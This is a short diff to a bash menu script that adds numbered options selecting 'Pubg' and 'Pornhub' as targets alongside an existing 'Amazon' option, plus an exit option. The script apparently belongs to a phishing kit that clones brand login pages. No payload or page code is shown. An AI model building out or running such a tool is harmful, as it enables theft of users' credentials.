@@ -240,6 +240,20 @@ elif [[ $option == 45 ]]; then
 server="Amazon"
 start
 
+elif [[ $option == 46 ]]; then
+server="Pubg"
+start
+
+elif [[ $option == 47 ]]; then
+server="Pornhub"
+start
+
+elif [[ $option == 0 || $option == 00 ]]; then
+sleep 1
+printf "\e[0m\n"
+printf "\e[0m\n"
+exit 1
+
 elif [[ $option == 99 ]]; then
 server="create"
 createpage
